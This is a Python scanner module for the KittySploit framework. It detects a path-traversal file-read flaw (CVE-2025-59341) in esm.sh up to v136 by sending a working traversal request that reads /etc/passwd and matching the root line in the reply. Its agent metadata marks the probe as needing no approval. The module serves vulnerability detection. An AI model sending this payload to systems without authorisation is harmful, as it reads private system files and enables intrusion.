#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""esm."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'esm.sh <= v136 - Local File Inclusion Detection',
        'description': 'esm.sh <= 136 contains a local file inclusion caused by improper URL handling, letting attackers read arbitrary files from the host filesystem remotely, exploit requires crafted request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'esm', 'lfi', 'traversal'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r',
            'https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-59341',
        ],
        'cve': 'CVE-2025-59341',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('esm.sh', 'A no-build JavaScript CDN', 'import React from',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='esm.sh <= v136 - Local File Inclusion detected', path=path)
            return True
        return False

